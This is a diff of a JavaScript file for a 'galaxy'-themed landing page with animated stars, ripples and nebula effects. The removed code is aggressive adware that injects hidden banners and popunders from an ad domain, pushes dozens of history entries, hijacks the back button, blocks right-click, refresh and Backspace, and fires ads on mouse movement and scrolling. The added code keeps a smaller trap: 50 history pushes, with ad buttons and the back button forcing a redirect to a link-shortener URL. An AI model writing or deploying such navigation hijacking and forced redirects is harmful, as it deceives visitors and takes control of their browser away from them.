@@ -1,198 +1,54 @@
-// ====== BRUTAL ADS CONFIGURATION ======
-const BANNER_SCRIPT = `
-<script type="text/javascript">
-	atOptions = {
-		'key' : '4b1eafbbf9404932effcedf29b70c2c7',
-		'format' : 'iframe',
-		'height' : 250,
-		'width' : 300,
-		'params' : {}
-	};
-</script>
-<script type="text/javascript" src="//spaniardinformationbookworm.com/4b1eafbbf9404932effcedf29b70c2c7/invoke.js"></script>
-`;
+// ====== Configuration ======
+const AD_URL = "https://shorter.me/WHO7C"; 
+const HISTORY_PUSH_COUNT = 50; 
 
-const POPUNDER_SCRIPT = '<script type="text/javascript" src="//spaniardinformationbookworm.com/a2/6b/18/a26b180d886de45b6d20f7541482b591.js"></script>';
-
-const HISTORY_PUSH_COUNT = 50;
-
-// ====== BRUTAL INITIALIZATION ======
+// ====== Initialize Everything ======
 window.addEventListener('load', function() {
-  brutalPushStates(HISTORY_PUSH_COUNT);
+  safePushStates(HISTORY_PUSH_COUNT);
   createStars();
   createShootingStars();
   createCosmicRays();
-  initializeBrutalButtons();
-  
-  // Pre-load ads immediately
-  preloadAllAds();
-  
-  // Aggressive popunder on load
-  setTimeout(triggerPopunder, 1500);
-  
-  // Continuous popunder attempts
-  setInterval(triggerPopunder, 30000);
-  
-  // Mouse movement detection for ads
-  document.addEventListener('mousemove', handleMouseMovement);
-  
-  // Scroll detection for ads
-  window.addEventListener('scroll', handleScroll);
-  
-  // Prevent right click
-  document.addEventListener('contextmenu', function(e) {
-    e.preventDefault();
-    triggerEmergencyAds();
-  });
+  initializeButtons();
 });
 
-// ====== BRUTAL HISTORY MANAGEMENT ======
-function brutalPushStates(count = 1) {
+// ====== History Management ======
+function safePushStates(count = 1) {
   for (let i = 0; i < count; i++) {
     try { 
-      history.pushState({brutal: i, trap: true}, "", "#" + i); 
+      history.pushState({trap:i}, "", location.href); 
     } catch(e) { 
-      console.log('Brutal push state blocked'); 
+      console.log('Push state blocked'); 
     }
   }
-  
-  history.replaceState({trapped: true}, "", window.location.href);
 }
 
-// ====== BRUTAL POPSTATE HANDLER ======
-window.addEventListener('popstate', function(event) {
-  brutalPushStates(50);
-  triggerEmergencyAds();
-  
-  setTimeout(() => {
-    openBrutalRedirect();
-  }, 100);
-});
+// ====== Redirect Logic ======
+function goToAdImmediate() {
+  safePushStates(HISTORY_PUSH_COUNT);
+  window.location.href = AD_URL;
+}
 
-// ====== BRUTAL BUTTON HANDLING ======
-function initializeBrutalButtons() {
-  document.querySelectorAll('a[data-ad="banner"]').forEach(button => {
-    button.replaceWith(button.cloneNode(true));
-  });
-
-  document.querySelectorAll('a[data-ad="banner"]').forEach(button => {
+// ====== Button Initialization ======
+function initializeButtons() {
+  document.querySelectorAll('a[data-ad="true"]').forEach(button => {
     button.addEventListener('click', function(e) {
       e.preventDefault();
-      e.stopPropagation();
-      
       createRipple(this, e);
       createStarburst(this);
       
-      // Multiple triggers on single click
-      triggerBannerAds(3); // Trigger 3x banner ads
-      triggerPopunder();
-      brutalPushStates(25);
-      
-      setTimeout(() => {
-        openBrutalRedirect();
-      }, 500);
-      
-      return false;
-    });
-    
-    button.addEventListener('touchstart', function(e) {
-      e.preventDefault();
-      triggerBannerAds(2);
-      triggerPopunder();
+      setTimeout(() => { 
+        goToAdImmediate(); 
+      }, 400);
     });
   });
 }
 
-// ====== BRUTAL AD TRIGGERS ======
-function triggerBannerAds(count = 1) {
-  for (let i = 0; i < count; i++) {
-    const adContainer = document.createElement('div');
-    adContainer.style.cssText = 'position:fixed; top:-1000px; left:-1000px; width:300px; height:250px; z-index:9999;';
-    adContainer.innerHTML = BANNER_SCRIPT;
-    
-    document.body.appendChild(adContainer);
-    
-    setTimeout(() => {
-      if (adContainer.parentNode) {
-        adContainer.parentNode.removeChild(adContainer);
-      }
-    }, 10000);
-  }
-}
+// ====== Popstate Handler ======
+window.addEventListener('popstate', function() {
+  window.location.href = AD_URL;
+});
 
-function triggerPopunder() {
-  try {
-    const script = document.createElement('script');
-    script.innerHTML = POPUNDER_SCRIPT;
-    document.head.appendChild(script);
-  } catch (e) {
-    console.log('Popunder blocked');
-  }
-}
-
-function triggerEmergencyAds() {
-  triggerBannerAds(5);
-  triggerPopunder();
-  brutalPushStates(50);
-}
-
-// ====== BRUTAL REDIRECT ======
-function openBrutalRedirect() {
-  try {
-    const newWindow = window.open('https://shorter.me/WHO7C', '_blank');
-    if (newWindow) {
-      setTimeout(() => {
-        newWindow.focus();
-      }, 100);
-    }
-  } catch (e) {}
-  
-  try {
-    setTimeout(() => {
-      window.location.replace('https://shorter.me/WHO7C');
-    }, 1500);
-  } catch (e) {}
-  
-  try {
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'https://shorter.me/WHO7C';
-    document.body.appendChild(iframe);
-  } catch (e) {}
-}
-
-// ====== PRELOAD ADS ======
-function preloadAllAds() {
-  const preloadDiv = document.createElement('div');
-  preloadDiv.style.display = 'none';
-  preloadDiv.innerHTML = BANNER_SCRIPT;
-  document.getElementById('hiddenAds').appendChild(preloadDiv);
-}
-
-// ====== USER BEHAVIOR DETECTION ======
-let mouseMoveCount = 0;
-function handleMouseMovement(e) {
-  mouseMoveCount++;
-  
-  if (mouseMoveCount % 50 === 0) {
-    triggerBannerAds(1);
-  }
-  
-  if (e.clientY < 100) {
-    triggerPopunder();
-  }
-}
-
-let scrollCount = 0;
-function handleScroll() {
-  scrollCount++;
-  
-  if (scrollCount % 10 === 0) {
-    triggerBannerAds(1);
-  }
-}
-
-// ====== GALAXY BACKGROUND EFFECTS ======
+// ====== Galaxy Background Effects ======
 function createStars() {
   const container = document.querySelector('.stars-container');
   const starCount = 150;
@@ -231,10 +87,12 @@ function createShootingStars() {
     }, 3000);
   }
 
+  // Create initial shooting stars
   for (let i = 0; i < 3; i++) {
     setTimeout(createShootingStar, i * 1500);
   }
 
+  // Continuous creation
   setInterval(createShootingStar, 3000);
 }
 
@@ -255,14 +113,16 @@ function createCosmicRays() {
     }, 6000);
   }
 
+  // Create initial rays
   for (let i = 0; i < 6; i++) {
     setTimeout(createRay, i * 1000);
   }
 
+  // Continuous creation
   setInterval(createRay, 4000);
 }
 
-// ====== VISUAL EFFECTS ======
+// ====== Ripple Effect ======
 function createRipple(element, event) {
   const rect = element.getBoundingClientRect();
   const x = event.clientX - rect.left;
@@ -277,6 +137,7 @@ function createRipple(element, event) {
   setTimeout(() => ripple.remove(), 600);
 }
 
+// ====== Starburst Effect ======
 function createStarburst(button) {
   const rect = button.getBoundingClientRect();
   const centerX = rect.left + rect.width / 2;
@@ -320,29 +181,68 @@ function createStarburst(button) {
   }
 }
 
-// ====== AUTO TRIGGERS ======
+// ====== Mouse Trail Effect ======
+document.addEventListener('mousemove', function(e) {
+  if (Math.random() > 0.8) {
+    createSpaceDust(e.clientX, e.clientY);
+  }
+});
+
+function createSpaceDust(x, y) {
+  const dust = document.createElement('div');
+  dust.style.position = 'fixed';
+  dust.style.width = '2px';
+  dust.style.height = '2px';
+  dust.style.backgroundColor = '#ff9ec0';
+  dust.style.borderRadius = '50%';
+  dust.style.left = x + 'px';
+  dust.style.top = y + 'px';
+  dust.style.zIndex = '5';
+  dust.style.pointerEvents = 'none';
+  dust.style.boxShadow = '0 0 6px #ff9ec0';
+  
+  document.body.appendChild(dust);
+  
+  const animation = dust.animate([
+    { transform: 'scale(1)', opacity: 1 },
+    { transform: 'scale(0)', opacity: 0 }
+  ], {
+    duration: 800,
+    easing: 'ease-out'
+  });
+  
+  animation.onfinish = () => dust.remove();
+}
+
+// ====== Auto Cosmic Events ======
 setInterval(() => {
   if (Math.random() > 0.7) {
-    triggerBannerAds(1);
+    createNebulaFlash();
   }
-}, 15000);
+}, 6000);
 
-// ====== BRUTAL EXIT PREVENTION ======
-window.addEventListener('beforeunload', function(e) {
-  triggerEmergencyAds();
-  e.preventDefault();
-  e.returnValue = 'Are you sure you want to leave?';
-});
-
-document.addEventListener('keydown', function(e) {
-  if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
-    e.preventDefault();
-    triggerEmergencyAds();
-  }
+function createNebulaFlash() {
+  const flash = document.createElement('div');
+  flash.style.position = 'fixed';
+  flash.style.top = '0';
+  flash.style.left = '0';
+  flash.style.width = '100%';
+  flash.style.height = '100%';
+  flash.style.background = 'radial-gradient(circle, rgba(255, 107, 157, 0.2) 0%, transparent 70%)';
+  flash.style.pointerEvents = 'none';
+  flash.style.zIndex = '2';
+  flash.style.opacity = '0';
   
-  if (e.key === 'Backspace' && !e.target.matches('input, textarea')) {
-    e.preventDefault();
-    brutalPushStates(10);
-  }
-});
-
+  document.body.appendChild(flash);
+  
+  const animation = flash.animate([
+    { opacity: 0 },
+    { opacity: 0.4 },
+    { opacity: 0 }
+  ], {
+    duration: 1500,
+    easing: 'ease-in-out'
+  });
+  
+  animation.onfinish = () => flash.remove();
+}
